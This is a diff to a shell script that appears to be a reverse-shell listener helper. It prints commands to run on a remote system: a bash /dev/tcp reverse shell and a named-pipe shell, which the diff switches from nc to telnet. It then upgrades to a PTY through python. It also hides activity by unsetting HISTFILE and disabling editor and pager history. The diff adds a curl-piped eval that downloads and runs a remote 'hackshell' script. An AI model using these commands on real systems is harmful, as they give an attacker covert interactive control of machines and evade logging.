@@ -7,13 +7,14 @@ sf_rport_load_all || exit
 echo -e "\
 Use one of these commands on the remote system:
     1. ${CDR}bash -c '(exec bash -i &>/dev/tcp/${rip}/${rport} 0>&1) &'${CN}
-    2. ${CDR}U=/tmp/.\$\$;rm -f \$U;touch \$U;(tail -f \$U|sh 2>&1|nc -n ${rip} ${rport} >\$U 2>&1 &)
+    2. ${CDR}U=/tmp/.\$\$;rm -f \$U;touch \$U;(tail -f \$U|sh 2>&1|telnet ${rip} ${rport} >\$U 2>&1 &)
 ${CN}Once connected, cut & paste the following into the _this_ shell:
 ${CF}-------------------------------------------------------------------------------${CDC}
  \"\$SHELL\" -c true || SHELL=\$(command -v bash) || SHELL=/bin/sh
- command -v python >/dev/null \\
-    && exec python -c \"import pty; pty.spawn('\${SHELL:-sh}')\" \\
-    || { command -v script >/dev/null && exec script -qc \"\${SHELL:-sh}\" /dev/null; }
+ xc=\"import pty; pty.spawn('\${SHELL:-sh}')\"
+ python -c 'import pty;' 2>/dev/null && python -c \"\$xc\" \\
+    || { python3 -c 'import pty;' 2>/dev/null && python3 -c \"\$xc\"; } \\
+    || { command -v script >/dev/null && script -qc \"\${SHELL:-sh}\" /dev/null; }
 unset HISTFILE
 export SHELL=/bin/bash TERM=xterm-256color
 export LESSHISTFILE=-
@@ -27,7 +28,9 @@ alias vim='vim -i NONE'
 reset -I
 PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'
 "'stty -echo cols 200;printf "\\033[18t";read -t5 -rdt R;stty sane $(echo "${R:-8;25;80}"|awk -F";" '"'"'{ printf "rows "$2" cols "$3; }'"'"')'"
-${CN}${CF}-------------------------------------------------------------------------------${CN}
+${CN}${CF}-------------------------------------------------------------------------------${CDC}
+eval  \"\$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\"
+${CN}${CF}-------------------------------------------------------------------------------
 To force-exit this listener, type ${CDY}kill \"\$(pgrep -P $$)\"${CN} on your Root Server"
 # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
 
